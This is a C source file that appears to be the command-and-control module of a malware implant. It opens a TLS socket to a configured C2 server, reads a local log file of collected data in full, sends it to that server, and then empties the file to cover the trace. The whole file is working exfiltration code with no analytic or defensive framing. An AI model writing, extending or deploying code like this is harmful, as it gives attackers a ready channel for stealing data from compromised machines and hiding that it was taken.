#include "c2_communication_fixed.h"
#include "payload_config.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

static SSL_CTX* ctx = NULL;
static SSL* ssl = NULL;
static int sockfd = -1;

void init_c2_communication() {
    // Initialize OpenSSL
    SSL_library_init();
    OpenSSL_add_all_algorithms();
    SSL_load_error_strings();
    
    // Create SSL context
    ctx = SSL_CTX_new(TLS_client_method());
    if (!ctx) {
        log_message("Failed to create SSL context");
        exit(1);
    }
    
    // Create socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        log_message("Failed to create socket");
        exit(1);
    }
    
    // Connect to C2 server
    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(C2_PORT);
    
    if (inet_pton(AF_INET, C2_SERVER, &server_addr.sin_addr) <= 0) {
        log_message("Invalid C2 server address: %s", C2_SERVER);
        exit(1);
    }
    
    if (connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        log_message("Failed to connect to C2 server");
        exit(1);
    }
    
    // Create SSL connection
    ssl = SSL_new(ctx);
    SSL_set_fd(ssl, sockfd);
    
    if (SSL_connect(ssl) <= 0) {
        log_message("Failed to establish SSL connection");
        ERR_print_errors_fp(stderr);
        exit(1);
    }
    
    log_message("C2 communication initialized successfully");
}

void send_logs_to_c2() {
    // Read log file
    FILE* f = fopen(LOG_FILE, "r");
    if (!f) {
        log_message("Failed to open log file: %s", LOG_FILE);
        return;
    }
    
    // Get file size
    fseek(f, 0, SEEK_END);
    long file_size = ftell(f);
    fseek(f, 0, SEEK_SET);
    
    if (file_size == 0) {
        fclose(f);
        return;
    }
    
    // Allocate buffer for log data
    char* buffer = (char*)malloc(file_size + 1);
    if (!buffer) {
        log_message("Failed to allocate memory for log data");
        fclose(f);
        return;
    }
    
    // Read log data
    fread(buffer, 1, file_size, f);
    buffer[file_size] = '\0';
    fclose(f);
    
    // Send log data over SSL
    int bytes_sent = SSL_write(ssl, buffer, file_size);
    if (bytes_sent <= 0) {
        log_message("Failed to send logs to C2 server");
        ERR_print_errors_fp(stderr);
    } else {
        log_message("Successfully sent %d bytes of logs to C2 server", bytes_sent);
        
        // Clear log file after successful send
        f = fopen(LOG_FILE, "w");
        if (f) {
            fclose(f);
        }
    }
    
    free(buffer);
}

void cleanup_c2_communication() {
    if (ssl) {
        SSL_shutdown(ssl);
        SSL_free(ssl);
    }
    
    if (sockfd >= 0) {
        close(sockfd);
    }
    
    if (ctx) {
        SSL_CTX_free(ctx);
    }
    
    log_message("C2 communication cleaned up successfully");
}